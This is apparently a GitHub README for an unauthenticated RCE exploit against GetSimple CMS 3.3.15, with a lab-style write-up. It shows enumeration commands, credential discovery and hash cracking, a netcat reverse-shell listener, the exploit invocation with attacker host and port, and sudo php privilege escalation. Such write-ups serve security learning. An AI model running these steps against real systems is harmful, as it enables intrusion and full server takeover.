# GetSimple-CMS-Version-3.3.15
GetSimple CMS RCE for version 3.3.15

# GetSimpleCMS Exploit
This script exploits a vulnerability in GetSimpleCMS version 3.3.15, allowing for unauthenticated remote code execution (RCE). The exploit leverages an arbitrary file upload vulnerability which can be triggered by leaking the CMS API key and targeting the session manager.

# Features
+ Detects GetSimpleCMS version
+ Retrieves necessary values (version, salt, username)
+ Generates a session cookie
+ Retrieves the nonce
+ Uploads a PHP payload to achieve RCE
+ Executes the provided command on the target server

# WriteUp
**1. Enumeration:**
```
rustscan -a 10.129.216.132 -- -A
```
**Result:**
<img width="1920" height="469" alt="Screenshot_20261109_214611" src="https://github.com/user-attachments/assets/24b992d1-fd59-4192-9489-1d0d2f0b21a7" />

**2. Web Enumeration:**
```
whatweb http://10.129.216.132
```
**Result:**
```
http://10.129.216.132 [200 OK] AddThis, Apache[2.4.41], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
```
**3. Directory Enumeration:**
```
ffuf -c -u http://10.129.216.132/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
<img width="1121" height="824" alt="Screenshot_20261109_214431" src="https://github.com/user-attachments/assets/f6170bb4-5e50-4763-94a8-34a2d39ba089" />

---
> The /admin directory was found, confirming the presence of an admin panel.

<img width="906" height="658" alt="Screenshot_20261109_214726" src="https://github.com/user-attachments/assets/0eac26f0-f163-4c1c-8c16-1659c6b9292c" />
 
---
> The /data directory containing interested subdirectories, I found Credentials for user admin.

<img width="1317" height="417" alt="Screenshot_20261109_214849" src="https://github.com/user-attachments/assets/48ac7921-aa1b-4c7d-b5bc-e161afeb215e" />

---
Then I cracked the hash that I found in crackstation website.

<img width="1011" height="417" alt="Screenshot_20261109_214945" src="https://github.com/user-attachments/assets/446ca38e-14b2-4075-99cf-e899a82a7965" />

---
<img width="1751" height="861" alt="Screenshot_20261109_215051" src="https://github.com/user-attachments/assets/ffb8d202-1a85-47a2-aba7-f1c1e323eb92" />

---
**4. Exploitation:**
- Run the script:

**1) Start listener**
```
nc -lvnp 4444
```

**2) Run exploit**
```
python3 getsimple.py http://TARGET/ --lhost YOUR_IP --lport 4444
```
<img width="1187" height="476" alt="pasted file" src="https://github.com/user-attachments/assets/176d9f3f-943b-4a28-a9ea-7c8239cbebd7" />

 ---
 Then I upgrade my shell...

<img width="776" height="560" alt="Screenshot_20261109_215423" src="https://github.com/user-attachments/assets/8a86a450-5a3d-499f-b985-978adf684ed9" />

---

**5. Privilege Escalation:**

```
use "sudo -l" or "sudo -ll" for more information.
```
<img width="1310" height="312" alt="Screenshot_20261109_215540" src="https://github.com/user-attachments/assets/97cf5972-1101-4b0d-9be5-c22e91d13e2a" />

---
We can run "php" as root without password, go to GTFOBins website.

<img width="1251" height="720" alt="Screenshot_20261109_220004" src="https://github.com/user-attachments/assets/4adad10b-2672-4da9-956a-bfaa800f1a31" />

<img width="808" height="230" alt="Screenshot_20261109_215832" src="https://github.com/user-attachments/assets/55693ddf-7d83-44ab-943c-71c5176d4c08" />




